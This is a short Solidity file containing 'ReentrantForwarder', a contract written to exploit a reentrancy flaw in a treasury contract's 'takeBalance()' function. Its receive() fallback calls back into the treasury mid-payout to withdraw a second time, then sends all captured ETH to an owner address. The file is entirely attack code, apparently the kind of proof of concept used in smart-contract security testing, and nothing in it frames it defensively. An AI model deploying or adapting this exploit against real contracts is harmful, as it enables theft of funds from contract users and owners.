// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface ITreasury {
    function takeBalance() external;
}

contract ReentrantForwarder {
    ITreasury public treasury;
    address payable public owner;
    bool public hasReentered;

    constructor(address treasuryAddress, address payable _owner) {
        treasury = ITreasury(treasuryAddress);
        owner = _owner;
    }

    function attack() external {
        treasury.takeBalance();
    }

    receive() external payable {
        if (!hasReentered) {
            hasReentered = true;
            treasury.takeBalance();
        }
        // forward any held ETH to owner
        if (address(this).balance > 0) {
            (bool success, ) = owner.call{value: address(this).balance}("");
            require(success, "forward failed");
        }
    }
}
